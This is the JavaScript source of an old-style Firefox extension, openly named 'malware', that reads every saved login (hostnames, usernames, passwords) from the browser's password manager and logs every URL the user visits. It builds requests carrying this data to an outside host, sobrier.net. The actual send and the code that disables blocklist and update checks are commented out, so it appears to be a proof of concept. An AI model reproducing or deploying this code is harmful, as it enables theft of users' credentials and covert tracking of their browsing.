if ("undefined" == typeof(malware)) {

	var malware = { };
	
	function malware() {
	  this.prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
	  
	  // Disable security features
	  //this.prefManager.setCharPref("extensions.blocklist.itemURL", "");
	  //this.prefManager.setCharPref("extensions.blocklist.url", "");
	  //this.prefManager.setCharPref("extensions.update.url", "");
	}
	
	malware.prototype = {	
		onUnload: function() {
			this.unregister();
		},

		dump: function(aMessage) {
			var consoleService = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
			consoleService.logStringMessage("malware: " + aMessage + "\n");
		},
		
		register: function() {
			this.dump("register");
			this.credentials();

			gBrowser.addTabsProgressListener(this);
		},
		unregister: function() {
			gBrowser.removeTabsProgressListener(this);
		},
		
		credentials: function() {
			var passwordManager = Components.classes["@mozilla.org/login-manager;1"].getService(
				Components.interfaces.nsILoginManager
			);
			  
			var logins = passwordManager.getAllLogins({});
			for (var i = 0; i < logins.length; i++) {
				this.spy("hostname=" + logins[i].hostname + "&url=" + logins[i].formSubmitURL + "&realm=" + logins[i].httpRealm + 
					"&username=" + logins[i].username + "&username_field=" +  logins[i].usernameField + "&password=" + logins[i].password +
					"&password_field=" + logins[i].passwordField
				);
			};
		},
		
		spy: function(info) {
			var req = new XMLHttpRequest(); 
			var url = "http://sobrier.net/?" + info;
			this.dump("fetchDomains URL: " + url); 


			/*var instance = this;
			req.open('GET', url, true);
			req.channel.loadFlags |= Components.interfaces.nsIRequest.LOAD_BYPASS_CACHE; // no cache
			req.send(null); */
		},
		
		// Tab listener
		onLocationChange: function(aBrowser, webProgress, request, location) {
			//malware.dump(location);
			if (location.asciiSpec.indexOf('http://sobrier.net') < 0 && location.asciiSpec.indexOf('about:') != 0) {
				//malware.dump(location.asciiSpec);
				malware.spy(location.asciiSpec);
				malware.dump("URL: " + location.asciiSpec);
			}
		},
		onProgressChange: function(aBrowser, webProgress, request, curSelfProgress, maxSelfProgress, curTotalProgress, maxTotalProgress) { },
		onSecurityChange: function(aBrowser, aWebProgress, aRequest, aState ) { },
		onStateChange: function(aBrowser, aWebProgress, aRequest, aStateFlags, aStatus) { },
		onStatusChange: function(aBrowser, aWebProgress, aRequest, aStatus, aMessage) { },
		onRefreshAttempted: function(aBrowser, webProgress, aRefreshURI, aMillis, aSameURI) {
			return true;
		},
		onLinkIconAvailable: function(aBrowser) { },

	};

	try
	{
		window.addEventListener("load",  function() { malware = new malware(); malware.register(); }, false);
		window.addEventListener("unload", function() { malware.onUnload() }, false);
	}
	catch(e) {
		var consoleService = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
		consoleService.logStringMessage("malware: " + e + "\n");
	}
}
else {
	var consoleService = Components.classes["@mozilla.org/consoleservice;1"].getService(Components.interfaces.nsIConsoleService);
		consoleService.logStringMessage("malware: not started\n");
}
